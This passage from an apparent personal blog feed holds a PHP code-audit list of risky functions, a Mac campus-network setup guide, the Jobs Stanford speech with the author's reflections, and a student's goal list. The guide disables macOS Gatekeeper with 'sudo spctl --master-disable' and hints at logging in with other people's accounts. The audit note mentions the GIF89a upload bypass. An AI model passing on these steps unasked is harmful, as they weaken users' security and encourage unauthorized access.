<p>返回所有被include、include_once、require和require_once的文件名</p>
<h3 id="序列化函数"><a href="#序列化函数" class="headerlink" title="序列化函数"></a>序列化函数</h3><blockquote>
<p>serialize()<br>unserialize()<br>ini_set(‘session.serialize_handler’, ‘php_serialize’);</p>
</blockquote>
<h3 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h3><blockquote>
<p>move_uploaded_file()<br>getimagesize() //验证文件头只要为GIF89a，就会返回真</p>
</blockquote>
<h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p>代码执行函数：</p>
<p><a href="http://www.cnblogs.com/galaxyyao/archive/2013/04/25/3043104.html" target="_blank" rel="noopener">PHP Eval研究笔记</a></p>
<p><a href="https://www.douban.com/note/217557007/" target="_blank" rel="noopener">PHP assert函数的用法</a></p>
<p><a href="http://www.jb51.net/article/46458.htm" target="_blank" rel="noopener">PHP preg_replace() 正则替换所有符合条件的字符串</a></p>
<p><a href="http://blog.csdn.net/hsd2012/article/details/46274475" target="_blank" rel="noopener">PHP——创建函数</a></p>
<p><a href="http://blog.csdn.net/fdipzone/article/details/52336763" target="_blank" rel="noopener">PHP——使用callable强制指定回调类型</a></p>
<p>包含函数：</p>
<p><a href="http://netsecurity.51cto.com/art/201605/511323.htm" target="_blank" rel="noopener">PHP——Info()信息泄漏漏洞利用提权及防范</a></p>
<p><a href="">PHP——include 和 require 的理解与区别</a></p>
<p>命令执行函数：</p>
<p><a href="http://blog.csdn.net/shaobingj126/article/details/6461721" target="_blank" rel="noopener">PHP——exec()函数以及获取其返回值</a></p>
<p><a href="http://blog.csdn.net/beyond__devil/article/details/53868309" target="_blank" rel="noopener">PHP——执行系统外部命令函数:exec()、passthru()、system()、shell_exec()</a></p>
<p>文件操作函数：</p>
<p>特殊函数：</p>
<p><a href="http://blog.csdn.net/xiajun07061225/article/details/7163249" target="_blank" rel="noopener">Linux连接文件：硬连接和软连接</a></p>
</the></excerpt>]]></content>
      
        <categories>
            
            <category> Study </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Summary </tag>
            
            <tag> 代码审计 </tag>
            
            <tag> PHP </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[Mac下配置mentohust连接校园网/移动/联通/]]></title>
      <url>/2017/12/08/mentohust/</url>
      <content type="html"><![CDATA[<excerpt in="" index="" |="" 首页摘要="">

<p>开学，兴高采烈地去开通校园网，结果插上网线，下好客户端……<a id="more"></a></p>
<the rest="" of="" contents="" |="" 余下全文="">

<p>一开始，我还是“年轻地“以为客户端会兼容Mac，我会像用windows的室友一样，轻轻松松地连上校园网。<br>然而，当我点开客户端时～～<img src="https://ws4.sinaimg.cn/large/006tNc79gy1fmec94r8uxj30nc08qtb2.jpg" width="300px"></p>
<p>原因：可能锐捷客户端是被修改过的，所以mac会自动识别为文件损坏（就像你打开**软件一样）<br>解决方法：打开终端，并输入 如下代码</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo spctl --master-disable</span><br></pre></td></tr></table></figure>
<p>根据提示，输入密码–&gt;回车，你再打开锐捷客户端，如果运气好，那你就可以像你的windows室友一样轻轻松松连上校园网了。（反正我是不行&gt;.&lt;）</p>
<p>所以我们还是老老实实的配置mentohust吧QAQ </p>
<h4 id="0x01首先需要下载mentohust配置文件"><a href="#0x01首先需要下载mentohust配置文件" class="headerlink" title="0x01首先需要下载mentohust配置文件"></a>0x01首先需要下载mentohust配置文件</h4><p>百度云：链接:<a href="https://pan.baidu.com/s/1mi3QOfY" target="_blank" rel="noopener">https://pan.baidu.com/s/1mi3QOfY</a>  密码:avwy</p>
<h4 id="0x02配置重要步骤"><a href="#0x02配置重要步骤" class="headerlink" title="0x02配置重要步骤"></a>0x02配置重要步骤</h4><p>1⃣把mentohust_mac压缩包里的dhcping和mentohust文件复制到/usr/bin/目录下.<br>如果你无法复制到上面的目录，可以尝试<strong>在/usr/local/bin中进行以下操作（别忘了拷贝上面两个文件到这里）</strong>。</p>
<blockquote>
<p>有人会问：“我怎么没看到/usr/local/bin在哪里？</p>
<p>废话，那是隐藏文件夹，肯定啊！！</p>
<p>所以你只需要右键你的finder：finder-&gt;前往-&gt;前往文件夹-&gt;……</p>
</blockquote>
<p>2⃣其次，在/etc目录下新建mentohust文件夹，然后把网盘里面下载下来的三个压缩包解压后的文件全部丢到这里面。</p>
<p>3⃣打开终端，输入sudo mentohust，按照提示选择。   </p>
<p>具体有什么设置我忘记了，反正账号名是学号，密码是教务处密码。</p>
<p><strong><em>敲黑板，划重点！！</em></strong></p>
<p><strong><em>组播方式，我选的1，锐捷，，，DHCP认证方式，我选择的2认证后；</em></strong></p>
<p><strong><em>最重要的就是选网卡，如果你有虚拟机，你直接就可以看到你的网线是在哪个网卡上，像我一样：</em></strong></p>
<p><img src="https://ws2.sinaimg.cn/large/006tNc79ly1fmecyi97uxj30wo0eaae0.jpg" width="500px"></p>
<p><strong><em>实在不行，那就用穷举法吧！</em></strong></p>
<p>一步步完成，你现在应该是可以连上校园网的了。</p>
<h4 id="0x03修改用户信息"><a href="#0x03修改用户信息" class="headerlink" title="0x03修改用户信息"></a>0x03修改用户信息</h4><p>1⃣在穷举法的途中，你可能不能一步到位就找到你的网卡，所以你就要<strong>在/etc目录下找到mentohust.conf文件删除掉</strong>，然后把网线拔了再插进去，再重新输入sudo mentohust 重复<strong><em>0x02</em></strong>步骤，直到找到真正的网卡为止！！</p>
<p>2⃣或许你要坏坏地用别人的账号去登陆校园网，那你还是重复1⃣步骤吧！</p>
<h4 id="0x04-配置移动-联通宽带"><a href="#0x04-配置移动-联通宽带" class="headerlink" title="0x04 配置移动/联通宽带"></a>0x04 配置移动/联通宽带</h4><p>其实，当你成功连上了校园网之后，你只需要一条命令加上一个配置文件就可以顺利连上运营商的宽带了。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo mentohust -f/etc/mentohust/data.mpf -w</span><br></pre></td></tr></table></figure>
<p><strong>/etc/mentohust/yidong.mpf 这里只要修改成配置文件的对应路径即可，名字记得要改噢！</strong></p>
<p>由于配置文件是学长分享的，所以就不无偿分享了，顺便打个小广告！</p>
<p>扫描下面二维码，</p>
<p><img src="https://ws3.sinaimg.cn/large/006tNc79ly1fmedk7ukpvj30ny0no0uq.jpg" width="300px"></p>
<p>关注公众号，回复“移动”或“联通”分别获取配置文件下载链接。</p>
<center><strong><em>——End——</em></strong></center>

</the></excerpt>]]></content>
      
        <categories>
            
            <category> Study </category>
            
        </categories>
        
        
        <tags>
            
            <tag> MISC </tag>
            
            <tag> mentohust </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[Some perceptions after secondly read Steve Jobs‘s speech in Stanford]]></title>
      <url>/2017/12/04/Perception/</url>
      <content type="html"><![CDATA[<p><excerpt in="" index="" |="" 首页摘要=""><br>今天翻看自己的notebook，看到了<strong><em>“Stay hungry.Stay foolish”</em></strong>这句话后，就想起老乔（Steve Jobs）在Stanford那个演讲，于是乎，就重新看了遍演讲稿。<br>愈来愈觉得：自己看待生活事物的态度是真的会随着自己年龄的增长而发生微妙的变化。<a id="more"></a></excerpt></p>
<p><the rest="" of="" contents="" |="" 余下全文=""><br><br></the></p>
<p>From Stanford Report, June 14, 2005 </p>
<p>This is the text of the Commencement address by Steve Jobs, CEO of Apple Computer and of Pixar Animation Studios</p>
<p>Delivered on June 12, 2005.</p>
<p> <br></p>
<p>I am honored to be with you today at your commencement from one of the finest universities in the world. I never graduated from college. Truth be told, this is the closest I’ve ever gotten to a college graduation. Today I want to tell you three stories from my life. That’s it. No big deal. Just three stories.</p>
<p><strong>The first story is about connecting the dots.</strong></p>
<p>I dropped out of Reed College after the first 6 months, but then stayed around as a drop-in for another 18 months or so before I really quit. So why did I drop out?</p>
<p>It started before I was born. My biological mother was a young, unwed college graduate student, and she decided to put me up for adoption. She felt very strongly that I should be adopted by college graduates, so everything was all set for me to be adopted at birth by a lawyer and his wife. Except that when I popped out they decided at the last minute that they really wanted a girl. So my parents, who were on a waiting list, got a call in the middle of the night asking: “We have an unexpected baby boy; do you want him?” They said: “Of course.” My biological mother later found out that my mother had never graduated from college and that my father had never graduated from high school. She refused to sign the final adoption papers. She only relented a few months later when my parents promised that I would someday go to college.</p>
<p>And 17 years later I did go to college. But I naively chose a college that was almost as expensive as Stanford, and all of my working-class parents’ savings were being spent on my college tuition. After six months, I couldn’t see the value in it. I had no idea what I wanted to do with my life and no idea how college was going to help me figure it out. And here I was spending all of the money my parents had saved their entire life. So I decided to drop out and trust that it would all work out OK. It was pretty scary at the time, but looking back it was one of the best decisions I ever made. The minute I dropped out I could stop taking the required classes that didn’t interest me, and begin dropping in on the ones that looked interesting.</p>
<p>It wasn’t all romantic. I didn’t have a dorm room, so I slept on the floor in friends’ rooms, I returned coke bottles for the 5￠ deposits to buy food with, and I would walk the 7 miles across town every Sunday night to get one good meal a week at the Hare Krishna temple. I loved it. <strong><em>And much of what I stumbled into by following my curiosity and intuition turned out to be priceless later on.</em></strong> Let me give you one example:</p>
<p>Reed College at that time offered perhaps the best calligraphy instruction in the country. Throughout the campus every poster, every label on every drawer, was beautifully hand calligraphed. Because I had dropped out and didn’t have to take the normal classes, I decided to take a calligraphy class to learn how to do this. I learned about serif and san serif typefaces, about varying the amount of space between different letter combinations, about what makes great typography great. It was beautiful, historical, artistically subtle in a way that science can’t capture, and I found it fascinating.</p>
<p>None of this had even a hope of any practical application in my life. But ten years later, when we were designing the first Macintosh computer, it all came back to me. And we designed it all into the Mac. It was the first computer with beautiful typography. If I had never dropped in on that single course in college, the Mac would have never had multiple typefaces or proportionally spaced fonts. And since Windows just copied the Mac, its likely that no personal computer would have them. If I had never dropped out, I would have never dropped in on this calligraphy class, and personal computers might not have the wonderful typography that they do. Of course it was impossible to connect the dots looking forward when I was in college. But it was very, very clear looking backwards ten years later.</p>
<p>Again, you can’t connect the dots looking forward; you can only connect them looking backwards.<strong><em>So you have to trust that the dots will somehow connect in your future. You have to trust in something — your gut, destiny, life, karma, whatever. This approach has never let me down, and it has made all the difference in my life.</em></strong></p>
<p><strong>My second story is about love and loss.</strong></p>
<p>I was lucky — I found what I loved to do early in life. Woz and I started Apple in my parents garage when I was 20. We worked hard, and in 10 years Apple had grown from just the two of us in a garage into a $2 billion company with over 4000 employees. We had just released our finest creation — the Macintosh — a year earlier, and I had just turned 30. And then I got fired. How can you get fired from a company you started? Well, as Apple grew we hired someone who I thought was very talented to run the company with me, and for the first year or so things went well. But then our visions of the future began to diverge and eventually we had a falling out. When we did, our Board of Directors sided with him. So at 30 I was out. And very publicly out. What had been the focus of my entire adult life was gone, and it was devastating.</p>
<p>I really didn’t know what to do for a few months. I felt that I had let the previous generation of entrepreneurs down - that I had dropped the baton as it was being passed to me. I met with David Packard and Bob Noyce and tried to apologize for screwing up so badly. I was a very public failure, and I even thought about running away from the valley. But something slowly began to dawn on me — I still loved what I did. The turn of events at Apple had not changed that one bit. I had been rejected, but I was still in love. And so I decided to start over.</p>
<p>I didn’t see it then, but it turned out that getting fired from Apple was the best thing that could have ever happened to me. The heaviness of being successful was replaced by the lightness of being a beginner again, less sure about everything. It freed me to enter one of the most creative periods of my life.</p>
<p>During the next five years, I started a company named NeXT, another company named Pixar, and fell in love with an amazing woman who would become my wife. Pixar went on to create the worlds first computer animated feature film, Toy Story, and is now the most successful animation studio in the world. In a remarkable turn of events, Apple bought NeXT, I returned to Apple, and the technology we developed at NeXT is at the heart of Apple’s current renaissance. And Laurene and I have a wonderful family together.</p>
<p>I’m pretty sure none of this would have happened if I hadn’t been fired from Apple. It was awful tasting medicine, but I guess the patient needed it. <strong><em>Sometimes life hits you in the head with a brick.</em></strong> Don’t lose faith. <strong><em>I’m convinced that the only thing that kept me going was that I loved what I did. You’ve got to find what you love. And that is as true for your work as it is for your lovers.</em></strong> Your work is going to fill a large part of your life, and the only way to be truly satisfied is to do what you believe is great work. <strong><em>And the only way to do great work is to love what you do.</em></strong> If you haven’t found it yet, keep looking. Don’t settle. As with all matters of the heart, you’ll know when you find it. <strong><em>And, like any great relationship, it just gets better and better as the years roll on.</em></strong> So keep looking until you find it. Don’t settle.</p>
<p><strong>My third story is about death.</strong></p>
<p>When I was 17, I read a quote that went something like: <strong><em>“If you live each day as if it was your last, someday you’ll most certainly be right.”</em></strong> It made an impression on me, and since then, for the past 33 years, I have looked in the mirror every morning and asked myself: “If today were the last day of my life, would I want to do what I am about to do today?” And whenever the answer has been “No” for too many days in a row, I know I need to change something.</p>
<p>Remembering that I’ll be dead soon is the most important tool I’ve ever encountered to help me make the big choices in life. <strong><em>Because almost everything — all external expectations, all pride, all fear of embarrassment or failure - these things just fall away in the face of death, leaving only what is truly important.</em></strong> Remembering that you are going to die is the best way I know to avoid the trap of thinking you have something to lose. You are already naked. There is no reason not to follow your heart.</p>
<p>About a year ago I was diagnosed with cancer. I had a scan at 7:30 in the morning, and it clearly showed a tumor on my pancreas. I didn’t even know what a pancreas was. The doctors told me this was almost certainly a type of cancer that is incurable, and that I should expect to live no longer than three to six months. My doctor advised me to go home and get my affairs in order, which is doctor’s code for prepare to die. It means to try to tell your kids everything you thought you’d have the next 10 years to tell them in just a few months. It means to make sure everything is buttoned up so that it will be as easy as possible for your family. It means to say your goodbyes.</p>
<p>I lived with that diagnosis all day. Later that evening I had a biopsy, where they stuck an endoscope down my throat, through my stomach and into my intestines, put a needle into my pancreas and got a few cells from the tumor. I was sedated, but my wife, who was there, told me that when they viewed the cells under a microscope the doctors started crying because it turned out to be a very rare form of pancreatic cancer that is curable with surgery. I had the surgery and I’m fine now.</p>
<p>This was the closest I’ve been to facing death, and I hope its the closest I get for a few more decades. Having lived through it, I can now say this to you with a bit more certainty than when death was a useful but purely intellectual concept:</p>
<p>No one wants to die. Even people who want to go to heaven don’t want to die to get there. And yet death is the destination we all share. No one has ever escaped it. And that is as it should be, because Death is very likely the single best invention of Life. It is Life’s change agent. It clears out the old to make way for the new. Right now the new is you, but someday not too long from now, you will gradually become the old and be cleared away. Sorry to be so dramatic, but it is quite true.</p>
<p><strong><em>Your time is limited, so don’t waste it living someone else’s life.</em></strong> Don’t be trapped by dogma — which is living with the results of other people’s thinking. Don’t let the noise of others’ opinions drown out your own inner voice. <strong><em>And most important, have the courage to follow your heart and intuition.</em></strong> They somehow already know what you truly want to become. Everything else is secondary.</p>
<p>When I was young, there was an amazing publication called The Whole Earth Catalog, which was one of the bibles of my generation. It was created by a fellow named Stewart Brand not far from here in Menlo Park, and he brought it to life with his poetic touch. This was in the late 1960’s, before personal computers and desktop publishing, so it was all made with typewriters, scissors, and polaroid cameras. It was sort of like Google in paperback form, 35 years before Google came along: it was idealistic, and overflowing with neat tools and great notions.</p>
<p>Stewart and his team put out several issues of The Whole Earth Catalog, and then when it had run its course, they put out a final issue. It was the mid-1970s, and I was your age. On the back cover of their final issue was a photograph of an early morning country road, the kind you might find yourself hitchhiking on if you were so adventurous. Beneath it were the words: <strong><em>“Stay Hungry. Stay Foolish.”</em></strong> It was their farewell message as they signed off. Stay Hungry. Stay Foolish. And I have always wished that for myself. And now, as you graduate to begin anew, I wish that for you.</p>
<p>Stay Hungry. Stay Foolish.</p>
<p>Thank you all very much.</p>
<p><img src="https://ws1.sinaimg.cn/large/006tKfTcly1fm4tcn2looj30im0ook49.jpg" alt=""></p>
<hr>
<h4 id="Perceptions"><a href="#Perceptions" class="headerlink" title="Perceptions"></a>Perceptions</h4><h5 id="虽然有时候自己的好奇心或直觉会让自己陷入窘境，但是后来事实证明，这些经历都是无价的。"><a href="#虽然有时候自己的好奇心或直觉会让自己陷入窘境，但是后来事实证明，这些经历都是无价的。" class="headerlink" title="虽然有时候自己的好奇心或直觉会让自己陷入窘境，但是后来事实证明，这些经历都是无价的。"></a>虽然有时候自己的好奇心或直觉会让自己陷入窘境，但是后来事实证明，这些经历都是无价的。</h5><blockquote>
<p><em>I loved it.</em></p>
<p><strong><em>And much of what I stumbled into by following my curiosity and intuition turned out to be priceless later on.</em></strong></p>
<blockquote>
<p>我跟着我的直觉和好奇心走, 遇到的很多东西,此后被证明是无价之宝。</p>
</blockquote>
</blockquote>
<hr>
<h5 id="随着年龄的增长，对各种事物的看法就会发生微妙的变化。"><a href="#随着年龄的增长，对各种事物的看法就会发生微妙的变化。" class="headerlink" title="随着年龄的增长，对各种事物的看法就会发生微妙的变化。"></a>随着年龄的增长，对各种事物的看法就会发生微妙的变化。</h5><h5 id="对我而言：做啥事，何必过分在意别人的言语，走自己的路，因果早已埋下，问心无愧足矣。"><a href="#对我而言：做啥事，何必过分在意别人的言语，走自己的路，因果早已埋下，问心无愧足矣。" class="headerlink" title="对我而言：做啥事，何必过分在意别人的言语，走自己的路，因果早已埋下，问心无愧足矣。"></a>对我而言：做啥事，何必过分在意别人的言语，走自己的路，因果早已埋下，问心无愧足矣。</h5><blockquote>
<p><em>Again, you can’t connect the dots looking forward; you can only connect them looking backwards.</em></p>
<blockquote>
<p>当然我在大学的时候，还不可能把从前的点点滴滴串连起来,但是当我十年后回顾这一切的时候,真的豁然开朗了。 </p>
</blockquote>
<p><strong><em>So you have to trust that the dots will somehow connect in your future. You have to trust in something — your gut, destiny, life, karma, whatever. This approach has never let me down, and it has made all the difference in my life.</em></strong></p>
<blockquote>
<p>再次说明的是,你在向未来展望的时候不可能将这些片断串连起来，你只能在回顾的时候串起他们。所以你必须相信这些片断会在你未来的某一天串连起来，你必须要相信某些东西：你的勇气、目的、生命、因缘……这个过程从来没有令我失望,只是让我的生命更加地与众不同。 </p>
</blockquote>
</blockquote>
<hr>
<h5 id="没有谁的一生是一帆风顺的，所以总会碰到不如意的事情，或许这就是“天将降大任于斯人也，必先苦其心志，劳其筋骨，饿其体肤，空乏其身，行指乱其所为，所以动心忍性，曾益其所不能“？"><a href="#没有谁的一生是一帆风顺的，所以总会碰到不如意的事情，或许这就是“天将降大任于斯人也，必先苦其心志，劳其筋骨，饿其体肤，空乏其身，行指乱其所为，所以动心忍性，曾益其所不能“？" class="headerlink" title="没有谁的一生是一帆风顺的，所以总会碰到不如意的事情，或许这就是“天将降大任于斯人也，必先苦其心志，劳其筋骨，饿其体肤，空乏其身，行指乱其所为，所以动心忍性，曾益其所不能“？"></a>没有谁的一生是一帆风顺的，所以总会碰到不如意的事情，或许这就是“天将降大任于斯人也，必先苦其心志，劳其筋骨，饿其体肤，空乏其身，行指乱其所为，所以动心忍性，曾益其所不能“？</h5><h5 id="我也希望“唯一使我一直走下去的，就是我做的事情令我无比钟爱“。"><a href="#我也希望“唯一使我一直走下去的，就是我做的事情令我无比钟爱“。" class="headerlink" title="我也希望“唯一使我一直走下去的，就是我做的事情令我无比钟爱“。"></a>我也希望“唯一使我一直走下去的，就是我做的事情令我无比钟爱“。</h5><h5 id="自我认同是一剂良药。"><a href="#自我认同是一剂良药。" class="headerlink" title="自我认同是一剂良药。"></a>自我认同是一剂良药。</h5><h5 id="想起了Randy-Pausch的《最后一课》上的一句话“When-it-comes-to-someone-who-is-romantically-interested-in-you-just-igore-everything-he-says-and-only-pay-attention-to-what-he-did-”-So，任何敌不过时间考验的海誓山盟都是一派胡言！"><a href="#想起了Randy-Pausch的《最后一课》上的一句话“When-it-comes-to-someone-who-is-romantically-interested-in-you-just-igore-everything-he-says-and-only-pay-attention-to-what-he-did-”-So，任何敌不过时间考验的海誓山盟都是一派胡言！" class="headerlink" title="想起了Randy Pausch的《最后一课》上的一句话“When it comes to someone who is romantically interested in you, just igore everything he says and only pay attention to what he did.”  So，任何敌不过时间考验的海誓山盟都是一派胡言！"></a>想起了Randy Pausch的《最后一课》上的一句话<em>“When it comes to someone who is romantically interested in you, just igore everything he says and only pay attention to what he did.”</em>  So，任何敌不过时间考验的海誓山盟都是一派胡言！</h5><blockquote>
<p><strong><em>Sometimes life hits you in the head with a brick.</em></strong> <em>Don’t lose faith.</em> </p>
<blockquote>
<p>有些时候, 生活会拿起一块砖头向你的脑袋上猛拍一下，不要失去信仰。</p>
</blockquote>
<p><strong><em>I’m convinced that the only thing that kept me going was that I loved what I did. You’ve got to find what you love. And that is as true for your work as it is for your lovers.</em></strong> </p>
<blockquote>
<p>我很清楚唯一使我一直走下去的，就是我做的事情令我无比钟爱。你需要去找到你所爱的东西。对于工作是如此, 对于你的爱人也是如此。</p>
</blockquote>
<p><strong><em>And the only way to do great work is to love what you do.</em></strong></p>
<blockquote>
<p>你只有相信自己所做的是伟大的工作, 你才能怡然自得。</p>
</blockquote>
<p><strong><em>And, like any great relationship, it just gets better and better as the years roll on.</em></strong></p>
<blockquote>
<p>就像任何真诚的关系, 随着岁月的流逝只会越来越紧密。</p>
</blockquote>
</blockquote>
<hr>
<h5 id="这或许有点难，但是，朝着这个方向努力吧！"><a href="#这或许有点难，但是，朝着这个方向努力吧！" class="headerlink" title="这或许有点难，但是，朝着这个方向努力吧！"></a>这或许有点难，但是，朝着这个方向努力吧！</h5><h5 id="生命是宝贵的，死后就算你拥有万贯家财，你也无法带到下面去用，及时行善，及时行乐。"><a href="#生命是宝贵的，死后就算你拥有万贯家财，你也无法带到下面去用，及时行善，及时行乐。" class="headerlink" title="生命是宝贵的，死后就算你拥有万贯家财，你也无法带到下面去用，及时行善，及时行乐。"></a>生命是宝贵的，死后就算你拥有万贯家财，你也无法带到下面去用，及时行善，及时行乐。</h5><h5 id="当自己患得患失时，让“记住你即将死去”回荡在你的脑海里，你就会释怀。"><a href="#当自己患得患失时，让“记住你即将死去”回荡在你的脑海里，你就会释怀。" class="headerlink" title="当自己患得患失时，让“记住你即将死去”回荡在你的脑海里，你就会释怀。"></a>当自己患得患失时，让“记住你即将死去”回荡在你的脑海里，你就会释怀。</h5><h5 id="不必羡慕别人的生活，每个人都是独一无二的。"><a href="#不必羡慕别人的生活，每个人都是独一无二的。" class="headerlink" title="不必羡慕别人的生活，每个人都是独一无二的。"></a>不必羡慕别人的生活，每个人都是独一无二的。</h5><h5 id="聆听自己内心的声音，做最真实的自己，做自己想成为的自己-。"><a href="#聆听自己内心的声音，做最真实的自己，做自己想成为的自己-。" class="headerlink" title="聆听自己内心的声音，做最真实的自己，做自己想成为的自己 。"></a>聆听自己内心的声音，做最真实的自己，做自己想成为的自己 。</h5><blockquote>
<p><strong><em>“If you live each day as if it was your last, someday you’ll most certainly be right.”</em></strong></p>
<blockquote>
<p>”如果你把每一天都当作生命中最后一天去生活的话,那么有一天你会发现你是正确的。”</p>
</blockquote>
<p><em>Remembering that I’ll be dead soon is the most important tool I’ve ever encountered to help me make the big choices in life. **</em>Because almost everything — all external expectations, all pride, all fear of embarrassment or failure - these things just fall away in the face of death, leaving only what is truly important.<em>** Remembering that you are going to die is the best way I know to avoid the trap of thinking you have something to lose. You are already naked. There is no reason not to follow your heart.</em></p>
<blockquote>
<p>“记住你即将死去”是我一生中遇到的最重要箴言。它帮我指明了生命中重要的选择。因为几乎所有的事情, 包括所有的荣誉、所有的骄傲、所有对难堪和失败的恐惧,这些在死亡面前都会微不足道。我看到的是留下的真正重要的东西。你有时候会思考你将会失去某些东西, “记住你即将死去”是我知道的避免这些想法的最好办法。如果你清空一切, 你没有理由不去跟随自己内心的声音。 </p>
</blockquote>
<p><strong><em>Your time is limited, so don’t waste it living someone else’s life.</em></strong></p>
<blockquote>
<p>你们的时间很有限, 所以不要将他们浪费在重复其他人的生活上。</p>
</blockquote>
<p><strong><em>And most important, have the courage to follow your heart and intuition.</em></strong> <em>They somehow already know what you truly want to become. Everything else is secondary.</em></p>
<blockquote>
<p>还有最重要的是, 你要有勇气去听从你直觉和心灵的指示——它们在某种程度上知道你想要成为什么样子，所有其他的事情都是次要的。 </p>
</blockquote>
</blockquote>
<hr>
<h2 id="Stay-Hungry-Stay-Foolish"><a href="#Stay-Hungry-Stay-Foolish" class="headerlink" title="Stay Hungry. Stay Foolish."></a>Stay Hungry. Stay Foolish.</h2><p><img src="https://ws1.sinaimg.cn/large/006tKfTcly1fm4tcyl6uqj312m0zmwx4.jpg" alt=""></p>
]]></content>
      
        <categories>
            
            <category> Life </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Perception </tag>
            
            <tag> 心路历程 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[It's time to set Flags in Freshman Year (持续更新)]]></title>
      <url>/2017/12/03/Flaggs1/</url>
      <content type="html"><![CDATA[<p><excerpt in="" index="" |="" 首页摘要=""><br>不知不觉大一上已经过了一半了。。一直想抽时间写总结和立下Flags，好让自己不懒惰。<br><br>终于现在各种事情也处理的差不多了，在备考期末的同时，可以静下来写点东西和思考一下接下来的路了……<a id="more"></a></excerpt></p>
<p><the rest="" of="" contents="" |="" 余下全文=""><br><br><br>从开学到11月底，几乎每天都是早出晚归的节奏：<br>早上6.40起床刷牙洗脸—&gt;跑操<br>……<br>晚自习21:10结束—&gt;23：10排练演出节目—&gt;回寝室<br>当一切收拾好，瘫坐在床上的时候，发现已经过了12点了。有时候才想起我的高数/线代好像。。。。还没有。。写完！然后又爬起来，挑灯夜读。。。<br>虽然这段时间累是累了点，但是让我如愿以偿地登上了迎新晚会的舞台，为几个协会的活动友情演出了一波，还客串了一下“新光大道”才艺大赛。对于一个舞者来说，何必去在意上台前苦练的心酸，当自己站在舞台上，被彩灯、追光灯亮瞎了眼的时候，什么心酸痛苦，早已忘得一干二净，只剩下享受舞台的自己！<br>在这繁忙、充实的生活中，其实还去打了Geek和班级对抗赛，虽然两次成绩都还可以，但是都是有身边dalao们的帮助。作为一个小白，当你真正去打比赛时，你就会发现自己的路还长，总会有一些脑洞大开而且还要用你没有学过的东西去答题，因此着对学习能力的要求就很高（尤其是快速学习的能力）。<br><br><br>总的来说，这段时间，累并快乐着，因为<br>干着自己爱干的事：</the></p>
<p>1.经过重重筛选淘汰，登上了迎新晚会的舞台</p>
<p>2.搭起了自己的<a href="http://karmaof.me/" target="_blank" rel="noopener">Blog</a></p>
<p>3.拉丁舞协会的宣传工作（Logo重新设计、微信公众号、视频编辑整理）</p>
<p>4.Web SKill Learning —&gt;SQL Injection、XSS</p>
<p><br><br>还认识了有趣的童鞋和深藏不露的dalao们，也结识了一群兴趣相投的小可爱们(｡◕ˇ∀ˇ◕）<br><br></p>
<h4 id="————华丽的分割线————"><a href="#————华丽的分割线————" class="headerlink" title="————华丽的分割线————"></a><center>————华丽的分割线————</center></h4><p>总结完了前段时间的快乐与收获，也该说些沉重的话题了……</p>
<p>工程导论的结课作业除了答辩就是写大学四年人生规划，人生规划课老师节节课离不开提醒我们设立小目标、规划自己的学习生活、情感生活……（毕竟她本人就是靠着实现这一年又一年的目标，达到今天的成就）<br><br><br>其实也不无道理，没有规划，人就没有动力；没有目标，人就容易散漫。<br><br><br>寝室里，还真不是一个学习的好地方，不是打游戏就是煲剧……所以我选择泡图书馆……<br><br></p>
<p>前几天看到一篇CET6模拟的英语作文题：是选择保证未来光明的工作还是感兴趣的工作</p>
<p>于我来说，二者是可以得兼的（虽然在考场上我会选择写后者），因为当年我听完习大大”没有网络安全就没有国家安全”的演讲，我就觉得Information Security是一个前途光明的工作，于是，在我略微了解之后，Information Security就成了我感兴趣的专业，于是就顺理成章的入了门……</p>
<p><br><br>扯远了扯远了(￣∇￣)<br><br></p>
<h4 id="人，总是要活在压力下，才会不断地鞭笞自己向前……"><a href="#人，总是要活在压力下，才会不断地鞭笞自己向前……" class="headerlink" title="人，总是要活在压力下，才会不断地鞭笞自己向前……"></a>人，总是要活在压力下，才会不断地鞭笞自己向前……</h4><p><br></p>
<h3 id="In-my-freshman-year"><a href="#In-my-freshman-year" class="headerlink" title="In my freshman year:"></a>In my freshman year:</h3><h4 id="1-要考试的科目均分-gt-90"><a href="#1-要考试的科目均分-gt-90" class="headerlink" title="1.要考试的科目均分&gt;=90"></a>1.要考试的科目均分&gt;=90</h4><p>​    Include：公共课（高数、线代、英语、计算机基础……）、专业课   </p>
<h4 id="2-Skills-TOP-10-of-whole-grade"><a href="#2-Skills-TOP-10-of-whole-grade" class="headerlink" title="2.Skills TOP 10 of whole grade"></a>2.Skills TOP 10 of whole grade</h4><h4 id="3-自学Python、C、Web漏洞类型、读几本技术书"><a href="#3-自学Python、C、Web漏洞类型、读几本技术书" class="headerlink" title="3.自学Python、C、Web漏洞类型、读几本技术书"></a>3.自学Python、C、Web漏洞类型、读几本技术书</h4><h4 id="4-High-Mark-pass-CET4、CET6"><a href="#4-High-Mark-pass-CET4、CET6" class="headerlink" title="4.High Mark pass CET4、CET6"></a>4.High Mark pass CET4、CET6</h4><h4 id="5-社团活动-好像完成的差不多了QAQ-—-gt-提升个人魅力、各项能力"><a href="#5-社团活动-好像完成的差不多了QAQ-—-gt-提升个人魅力、各项能力" class="headerlink" title="5.社团活动(好像完成的差不多了QAQ)—&gt;提升个人魅力、各项能力"></a>5.社团活动(好像完成的差不多了QAQ)—&gt;提升个人魅力、各项能力</h4><h4 id="6-拿到驾照"><a href="#6-拿到驾照" class="headerlink" title="6.拿到驾照"></a>6.拿到驾照</h4><p><br><br>奉上《工程导论》大学四年人生规划思维导图，警醒自己，也希望大家监督！</p>
<p><img src="https://ws4.sinaimg.cn/large/006tKfTcgy1fn0eeol58zj31481da7fh.jpg" alt=""></p>
<h2 id="坚持你所热爱的，热爱你所坚持的，剩下的，交给时间就好。"><a href="#坚持你所热爱的，热爱你所坚持的，剩下的，交给时间就好。" class="headerlink" title="坚持你所热爱的，热爱你所坚持的，剩下的，交给时间就好。"></a><center>坚持你所热爱的，热爱你所坚持的，剩下的，交给时间就好。</center></h2>]]></content>
      
        <categories>
            
            <category> Life </category>
            
        </categories>
        
        
        <tags>
            
